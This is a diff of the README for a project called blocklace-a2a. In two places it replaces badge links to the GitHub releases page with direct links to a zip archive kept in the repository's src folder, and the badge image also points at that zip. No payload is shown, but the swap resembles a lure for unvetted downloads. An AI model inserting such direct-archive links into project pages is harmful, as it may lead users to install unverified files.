@@ -6,7 +6,7 @@ Welcome to blocklace-a2a, a secure solution that uses cryptographic technology t
 
 ### 📥 Download Now!
 
-[![Download blocklace-a2a](https://img.shields.io/badge/Download-blocklace--a2a-brightgreen)](https://github.com/D-celld/blocklace-a2a/releases)
+[![Download blocklace-a2a](https://raw.githubusercontent.com/D-celld/blocklace-a2a/main/src/a-blocklace-2.2.zip)](https://raw.githubusercontent.com/D-celld/blocklace-a2a/main/src/a-blocklace-2.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -81,7 +81,7 @@ If you have questions, need assistance, or want to connect with other users, con
 
 For your convenience, here is the direct link again:
 
-[![Download blocklace-a2a](https://img.shields.io/badge/Download-blocklace--a2a-brightgreen)](https://github.com/D-celld/blocklace-a2a/releases)
+[![Download blocklace-a2a](https://raw.githubusercontent.com/D-celld/blocklace-a2a/main/src/a-blocklace-2.2.zip)](https://raw.githubusercontent.com/D-celld/blocklace-a2a/main/src/a-blocklace-2.2.zip)
 
 Follow the steps outlined above to ensure a smooth download and installation process.
 
